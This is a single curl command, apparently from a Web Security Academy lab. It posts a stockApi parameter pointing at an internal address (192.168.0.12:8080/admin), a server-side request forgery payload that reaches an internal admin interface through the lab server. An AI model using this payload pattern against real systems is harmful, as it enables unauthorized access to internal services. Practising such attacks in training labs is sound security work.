curl -s "https://<lab-url>.web-security-academy.net/product/stock" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "stockApi=http://192.168.0.12:8080/admin" | cat
